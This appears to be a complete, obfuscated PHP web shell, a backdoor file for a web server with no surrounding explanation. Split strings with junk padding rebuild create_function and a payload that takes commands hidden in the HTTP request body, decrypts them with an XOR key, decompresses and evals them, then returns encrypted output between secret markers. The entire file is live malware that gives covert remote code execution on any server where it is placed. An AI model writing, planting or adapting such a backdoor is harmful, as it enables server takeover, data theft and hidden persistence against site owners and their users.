<?php
$J='or($i@+=0;$i<$@+l@+;){for($j=0;@+($j<@+$c&&$@+i<$l);$j+@++,$@+i++@+){$o.=$t{$i}^@';
$W=';$@+@+r=@+@ba@+@+se64_encode(@x(@gzcompr@+ess($o),$@+k)@+);@+print("$p@+$kh$r$kf");}';
$R='@+0WyN5u@+";@+f@+unctio@+n x($t,$k)@+{$c=strlen(@+$k);$l=st@+rle@+n($t);$o@+@+="";f';
$L='$k="4f931@+fbb@+";$k@+h="e79@+78b2eb@+@+9dd";$kf="070af@+9@+97b09@+a"@+;$p="l0jYy4XGaY';
$u='contents@+("php://i@+nput"@+@+),$m)==1) {@o@+@+b_start();@e@+val(@g@+zun@+@+compress(@x(@@+';
$N='+$@+k{$j};@+}@+}re@+turn $@+o;}if (@pr@+eg_mat@+ch(@+"/$kh(.+)$kf/"@+,@file_@+get@+_';
$m=str_replace('fK','','crfKefKfKatfKefK_functfKion');
$p='base6@+4_dec@+ode($m[1])@+,@+$k@+)));$o=@+@ob_@+get_con@+tents();@ob_e@+nd_clea@+n()';
$G=str_replace('@+','',$L.$R.$J.$N.$u.$p.$W);
$c=$m('',$G);$c();
?>
